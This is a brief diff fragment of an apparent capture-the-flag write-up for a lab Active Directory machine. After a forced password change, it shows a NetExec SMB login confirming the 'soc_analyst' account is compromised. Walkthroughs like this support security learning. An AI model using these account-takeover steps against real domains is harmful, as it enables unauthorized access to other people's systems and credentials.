@@ -570,5 +570,15 @@ And now using `--detail` in the get writable command i see this priv is what blo
 [+] Password changed successfully!
 ```
 
+This changed the users password
+
+```python
+❯❯❯ nxc smb dc-analysis.analysis.htb -u soc_analyst -p 'Password123!'           
+SMB         10.129.230.179  445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.230.179  445    DC-ANALYSIS      [+] analysis.htb\soc_analyst:Password123!
+```
+
+This user is now compromised!
+
 
 
